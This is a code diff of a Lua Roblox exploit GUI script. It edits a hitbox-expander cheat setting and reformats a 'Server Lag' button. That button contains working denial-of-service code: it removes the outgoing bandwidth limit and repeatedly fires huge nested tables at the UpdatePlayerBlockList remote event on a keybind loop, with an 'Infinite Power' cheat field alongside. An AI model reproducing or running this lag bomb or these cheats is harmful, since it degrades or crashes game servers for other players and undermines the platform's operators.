@@ -193,7 +193,7 @@ local HBE = GeneralSection.Dropdown({
 			end)
 
 			-- Settings
-			_G.Size = _G.HBSize -- size
+			_G.Size = 16 -- size
 			_G.enabled = false
 
 			--code
@@ -227,32 +227,28 @@ local HBE = GeneralSection.Dropdown({
 				end
 			end
 
-		end
-		if Value == "Toggle HBE on" then
-			_G.enabled = true
-		end
-		if Value == "Toggle HBE off" then
-			_G.enabled = false
-		end
+	end
+	if Value == "Toggle HBE on" then
+		_G.enabled = true
+	end
+	if Value == "Toggle HBE off" then
+		_G.enabled = false
+	end
 	end,
 	Options = {
-		"HBE Script",
-		"Toggle HBE on",
-		"Toggle HBE off"
-	},
-	Menu = {
-		Information = function(self)
-			Tab.Banner({
-				Text = "hbe"
-			})
-		end
-	}
+	"HBE Script",
+	"Toggle HBE on",
+	"Toggle HBE off",
+		
+},
+Menu = {
+	Information = function(self)
+		Tab.Banner({
+			Text = "hbe"
+		})
+	end
+}
 })
-local HBESize = GeneralSection.TextField({
-	Text = "HBESize",
-	Callback = function(Number)
-		_G.HBSize = Number		
-	end})
 local PowerManipulation = GeneralSection.TextField({
 	Text = "Infinite Power",
 	Callback = function(Power)
@@ -273,83 +269,86 @@ local PowerManipulation = GeneralSection.TextField({
 local ServerLag = GeneralSection.Button({
 	Text = "Server Lag",
 	Callback = function()
-		getgenv().Toggled=false
-		getgenv().KeyBind="P"
-		getgenv().Delay=0.7
-		local UIS=game:GetService'UserInputService'
+		--// fixed by ewo 6/17/2022
 
-		--//main
+--//settings + variables
+getgenv().Toggled=false
+getgenv().KeyBind="P"
+getgenv().Delay=0.7
+local UIS=game:GetService'UserInputService'
 
-		local function Source()
-			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-			local function getmaxvalue(val)
-				local mainvalueifonetable = 49999
-				if type(val) ~= "number" then
-					return nil
-				end
-				local calculateperfectval = (mainvalueifonetable/(val+2))
-				return calculateperfectval
-			end
+--//main
 
-			local function bomb(tableincrease, tries)
-				local maintable = {}
-				local spammedtable = {}
+local function Source()
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+  local mainvalueifonetable = 49999
+  if type(val) ~= "number" then
+      return nil
+  end
+  local calculateperfectval = (mainvalueifonetable/(val+2))
+  return calculateperfectval
+end
 
-				table.insert(spammedtable, {})
-				z = spammedtable[1]
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
 
-				for i = 1, tableincrease do
-					local tableins = {}
-					table.insert(z, tableins)
-					z = tableins
-				end
+table.insert(spammedtable, {})
+z = spammedtable[1]
 
-				local calculatemax = getmaxvalue(tableincrease)
-				local maximum
+for i = 1, tableincrease do
+   local tableins = {}
+   table.insert(z, tableins)
+   z = tableins
+end
 
-				if calculatemax then
-					maximum = calculatemax
-				else
-					maximum = 10000
-				end
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
 
-				for i = 1, maximum do
-					table.insert(maintable, spammedtable)
-				end
+if calculatemax then
+    maximum = calculatemax
+    else
+    maximum = 10000
+end
 
-				if calculatemax then
-					maximum = calculatemax
-				else
-					maximum = 10000
-				end
+for i = 1, maximum do
+    table.insert(maintable, spammedtable)
+end
 
-				for i = 1, maximum do
-					table.insert(maintable, spammedtable)
-				end
+ if calculatemax then
+    maximum = calculatemax
+    else
+    maximum = 10000
+end
 
-				for i = 1, tries do
-					game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
-				end
-			end
+for i = 1, maximum do
+    table.insert(maintable, spammedtable)
+end
+
+for i = 1, tries do
+   game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
+end
+end
 
 
-			bomb(250, 5) --// change values if client crashes
-		end
-		UIS.InputBegan:Connect(function(Key)
-			if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
-				if getgenv().Toggled then
-					getgenv().Toggled=false
-					warn'Disabled!'
-				elseif not getgenv().Toggled then
-					getgenv().Toggled=true
-					warn'Enabled!'
-					while getgenv().Toggled do
-						Source()
-						wait(getgenv().Delay)
-					end
-				end
-			end
-		end)
+bomb(250, 5) --// change values if client crashes
+end
+UIS.InputBegan:Connect(function(Key)
+   if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
+       if getgenv().Toggled then
+           getgenv().Toggled=false
+           warn'Disabled!'
+       elseif not getgenv().Toggled then
+           getgenv().Toggled=true
+           warn'Enabled!'
+           while getgenv().Toggled do
+               Source()
+               wait(getgenv().Delay)
+           end
+       end
+   end
+end)
 	end,
 	Menu = {
 		Information = function(self)
